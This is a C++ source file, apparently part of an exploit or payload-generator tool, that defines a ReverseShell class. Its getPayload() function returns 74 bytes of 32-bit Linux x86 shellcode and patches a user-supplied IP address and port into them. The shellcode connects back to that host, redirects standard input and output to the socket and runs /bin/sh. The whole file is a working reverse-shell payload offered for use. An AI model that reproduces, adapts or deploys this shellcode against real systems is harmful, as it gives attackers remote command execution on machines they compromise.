#include "Payloads/ReverseShell/ReverseShell.hpp"

uint8_t* ReverseShell::getPayload(size_t* length, argparse::ArgumentParser program)
{
    std::string ip = program.get<std::string>("--shell-ip");
    uint16_t port = (uint16_t)program.get<int>("--shell-port");

    uint32_t ip0, ip1, ip2, ip3;
    if (sscanf(ip.c_str(), "%i.%i.%i.%i", &ip0, &ip1, &ip2, &ip3) == EOF)
        ip0 = 127, ip1 = 0, ip2 = 0, ip3 = 1;

    size_t len = 74;
    if (length != nullptr)
        *length = len;
    
    uint8_t payload[] = {
        0x6a, 0x66, 0x58, 0x6a, 0x01, 0x5b, 0x31, 0xd2, 0x52, 0x53, 0x6a, 0x02, 0x89, 0xe1, 0xcd, 0x80,
        0x92, 0xb0, 0x66, 0x68, 0x00, 0x00, 0x00, 0x00, 0x66, 0x68, 0x00, 0x00, 0x43, 0x66, 0x53, 0x89,
        0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 0xe1, 0x43, 0xcd, 0x80, 0x6a, 0x02, 0x59, 0x87, 0xd3, 0xb0,
        0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x0b, 0x41, 0x89, 0xca, 0x52, 0x68, 0x2f, 0x2f, 0x73,
        0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0xcd, 0x80,
    };

    payload[20] = ip0; // 127
    payload[21] = ip1; // 0
    payload[22] = ip2; // 0
    payload[23] = ip3; // 1
    payload[26] = ((port >> (8* 1)) & 0xff); // Port High
    payload[27] = ((port >> (8* 0)) & 0xff); // Port Low

    uint8_t* buffer = new uint8_t[len];
    memcpy(buffer, payload, len);
    return buffer;
}